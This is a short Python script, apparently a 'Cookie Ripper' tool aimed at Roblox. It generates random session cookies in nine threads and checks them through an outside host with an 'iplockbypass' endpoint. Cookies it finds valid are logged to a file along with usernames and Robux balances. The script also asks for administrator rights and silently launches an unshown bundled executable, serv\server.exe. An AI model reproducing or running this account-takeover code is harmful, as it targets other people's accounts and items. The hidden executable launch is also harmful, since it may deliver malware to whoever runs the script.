import requests, json, re
import random, string
import os
import threading
import ctypes
import requests
import re
import string
import random
from colorama import *
import time
init()
os.system("cls")

def logo():

    print(Fore.RED + f"""

                   ,____
                   |---.|
           ___     |    `
          / .-\  ./=)
         |  |"|_/\/|
         ;  |-;| /_| 
        / \_| |/ \ |      _____         _   _     _____ _          
       /      \/\( |     |     |___ ___| |_|_|___| __  |_|___ ___ ___ ___
       |   /  |` ) |     |   --| . | . | '_| | -_|    -| | . | . | -_|  _|
       /   \ _/    |     |_____|___|___|_,_|_|___|__|__|_|  _|  _|___|_| 
      /--._/  \    |                                     |_| |_|   
      `/|)    |    /
        /     |   |
      .'      |   |
     /         \  |
    (_.-.__.__./  /
    """)

                                                     



def process1():
  while True:
    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    rancookie = ''.join((random.choice(valid_letters) for i in range(1356)))
    finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

    cookie = requests.get(
      f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text

    r = requests.get(
      f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
    data = r.json()

    if data["error"] == "Invalid-Cookie":
      os.system("cls")
      logo()
      falsecookie = rancookie[:1356]
      print(Back.RED + Fore.WHITE + "[INVALID]" + Back.BLACK + "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + Back.BLACK + falsecookie)
    elif data["status"] == "good":

      falsecookie = rancookie[:9]
      robuxamount = str(data['robux'])
      print(
        f"[VALID]" + falsecookie +
        f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File."
      )
      f = open("cookies.txt", "a")
      f.write(str(rancookie + " Robux: " + robuxamount + "\n"))
      f.close()

    else:
      exit()

is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
if is_admin != True:
  print(Back.RED + Fore.WHITE + "[WARNING]" + Back.BLACK + " No administrator privlage, rate will be slow!")
  time.sleep(5)
else:
  pass
cwd = os.getcwd()
os.startfile(f"{cwd}\\serv\\server.exe")
t1 = threading.Thread(target=process1)
t2 = threading.Thread(target=process1)
t3 = threading.Thread(target=process1)
t4 = threading.Thread(target=process1)
t5 = threading.Thread(target=process1)
t6 = threading.Thread(target=process1)
t7 = threading.Thread(target=process1)
t8 = threading.Thread(target=process1)
t9 = threading.Thread(target=process1)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()

